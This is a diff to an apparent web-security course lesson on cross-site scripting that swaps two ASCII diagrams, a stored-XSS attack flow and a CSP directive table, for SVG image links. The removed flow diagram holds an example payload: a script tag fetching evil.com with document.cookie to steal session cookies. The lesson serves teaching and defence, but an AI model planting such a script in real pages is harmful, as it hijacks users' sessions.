@@ -134,34 +134,7 @@ The last true sets the HttpOnly flag for the cookie.
 
 ## XSS Attack Flow Diagram
 
-```diagram
-┌──────────────────────────────────────────────────────────────┐
-│              Stored XSS Attack Flow                          │
-│                                                              │
-│  1. Attacker posts malicious comment:                        │
-│     <script>fetch('https://evil.com/steal?c='+              │
-│     document.cookie)</script>                                │
-│                                                              │
-│  ┌──────────┐    ┌──────────────┐    ┌──────────────┐       │
-│  │ Attacker  │───>│  Web Server   │───>│   Database    │      │
-│  └──────────┘    └──────────────┘    └──────────────┘       │
-│                                            │                 │
-│  2. Victim views the page with the comment │                 │
-│                                            v                 │
-│  ┌──────────┐    ┌──────────────┐    ┌──────────────┐       │
-│  │  Victim   │<───│  Web Server   │<───│   Database    │      │
-│  │ Browser   │    │  serves page  │    │ returns data  │      │
-│  └──────────┘    └──────────────┘    └──────────────┘       │
-│       │                                                      │
-│       │  3. Browser executes the script                      │
-│       v                                                      │
-│  ┌──────────────┐                                           │
-│  │ evil.com      │  4. Cookie sent to attacker               │
-│  │ receives      │                                           │
-│  │ session cookie│                                           │
-│  └──────────────┘                                           │
-└──────────────────────────────────────────────────────────────┘
-```
+![xss_attack_flow_diagram](svg/courses/security/cyber-attacks-and-vectors/07_xss/xss_attack_flow_diagram.svg)
 
 ---
 
@@ -301,23 +274,7 @@ Content-Security-Policy:
     report-uri /csp-report;
 ```
 
-```diagram
-┌──────────────────────────────────────────────────┐
-│          CSP Directive Reference                  │
-├──────────────────────────────────────────────────┤
-│  default-src    Fallback for all resource types  │
-│  script-src     JavaScript sources               │
-│  style-src      CSS sources                      │
-│  img-src        Image sources                    │
-│  connect-src    Fetch/XHR/WebSocket targets      │
-│  frame-src      iframe sources                   │
-│  font-src       Font file sources                │
-│  object-src     Plugin content (Flash, etc.)     │
-│  base-uri       Restrict <base> tag              │
-│  form-action    Restrict form submission targets │
-│  report-uri     Where to send violation reports  │
-└──────────────────────────────────────────────────┘
-```
+![strict_csp_that_prevents_most_xss](svg/courses/security/cyber-attacks-and-vectors/07_xss/strict_csp_that_prevents_most_xss.svg)
 
 ---
 
